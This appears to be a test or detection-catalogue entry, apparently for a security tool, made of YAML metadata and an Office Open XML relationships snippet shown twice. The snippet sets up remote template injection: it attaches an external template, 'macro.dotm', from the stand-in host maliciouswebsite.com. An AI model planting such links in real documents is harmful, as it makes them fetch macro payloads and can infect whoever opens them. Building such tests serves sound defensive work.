---
id: c118f100-89a0-4b23-aaba-1f43e67234d9
name: XML file with external template link
type: command
executor: bash
data: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship
  Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
  Target="http://maliciouswebsite.com/macro.dotm" TargetMode="External"/></Relationships>'
output: null
created_at: '2023-04-06T03:56:23.897382+00:00'
updated_at: '2023-04-10T20:36:52.682900+00:00'
---

# XML file with external template link

```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://maliciouswebsite.com/macro.dotm" TargetMode="External"/></Relationships>
```


